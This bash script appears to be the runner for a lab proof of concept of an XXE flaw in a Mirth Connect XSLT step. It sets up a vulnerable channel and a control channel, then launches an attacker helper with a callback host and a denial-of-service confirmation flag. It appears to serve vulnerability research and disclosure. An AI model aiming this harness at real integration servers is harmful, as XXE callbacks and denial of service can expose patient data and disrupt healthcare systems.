#!/usr/bin/env bash
set -euo pipefail

POC_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
source "$POC_DIR/../../lab/common.sh"
trap cleanup_lab EXIT
mkdir -p "$POC_DIR/../evidence"
exec > >(tee "$POC_DIR/../evidence/current-run.log") 2>&1

CANARY="MIRTH_XSLT_XXE_CANARY_${LAB_OWNER}"
start_target "$CANARY"
install_channel "$POC_DIR/channel.xml" 'mirth-poc-xslt-xxe'
CONTROL_FIXTURE="$LAB_STATE_DIR/xslt-control-channel.xml"
sed \
  -e 's/mirth-poc-xslt-xxe/mirth-poc-xslt-control/g' \
  -e 's/PoC - XSLT Step XXE/PoC - XSLT Control/g' \
  -e 's/<port>9999<\//<port>9998<\//g' \
  "$POC_DIR/channel.xml" >"$CONTROL_FIXTURE"
install_channel "$CONTROL_FIXTURE" 'mirth-poc-xslt-control'
wait_listener 9999
wait_listener 9998
run_attacker "$POC_DIR" \
  --target "http://${TARGET_CONTAINER}:9999/" \
  --control-target "http://${TARGET_CONTAINER}:9998/" \
  --admin-health-url "https://${TARGET_CONTAINER}:8443/api/server/version" \
  --callback-host "$ATTACKER_CONTAINER" \
  --confirm-dos \
  --expect "$CANARY"
